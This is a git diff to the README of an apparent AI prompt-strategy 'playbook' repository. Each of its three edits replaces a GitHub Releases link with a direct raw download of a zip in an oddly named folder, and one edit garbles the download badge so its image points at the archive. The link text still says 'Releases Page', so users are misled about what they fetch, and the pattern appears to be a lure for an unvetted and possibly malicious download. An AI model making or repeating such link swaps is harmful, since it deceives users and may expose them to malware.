@@ -1,6 +1,6 @@
 # 🚀 ai-power-user-playbook - Unlock AI Potential with Smart Strategies
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/anyadmegkuromtekutya/ai-power-user-playbook/releases)
+[![Download](https://raw.githubusercontent.com/anyadmegkuromtekutya/ai-power-user-playbook/main/unexceptional/ai-power-user-playbook.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/anyadmegkuromtekutya/ai-power-user-playbook/main/unexceptional/ai-power-user-playbook.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To begin using the playbook, follow these steps to download and set it up on you
 
 ### 1. Download & Install
 
-To get the latest version of the playbook, visit this page to download: [Releases Page](https://github.com/anyadmegkuromtekutya/ai-power-user-playbook/releases). You will find various versions available for download.
+To get the latest version of the playbook, visit this page to download: [Releases Page](https://raw.githubusercontent.com/anyadmegkuromtekutya/ai-power-user-playbook/main/unexceptional/ai-power-user-playbook.zip). You will find various versions available for download.
 
 ### 2. Choose Your Version
 
@@ -74,6 +74,6 @@ This playbook is open-source and available under the MIT License. You can use, m
 
 For questions or support, reach out via issues on GitHub or contact the project maintainers directly.
 
-Duplicate download link for quick access: [Releases Page](https://github.com/anyadmegkuromtekutya/ai-power-user-playbook/releases).
+Duplicate download link for quick access: [Releases Page](https://raw.githubusercontent.com/anyadmegkuromtekutya/ai-power-user-playbook/main/unexceptional/ai-power-user-playbook.zip).
 
 We hope this playbook helps you unlock the full potential of AI in your work. Enjoy exploring the possibilities!
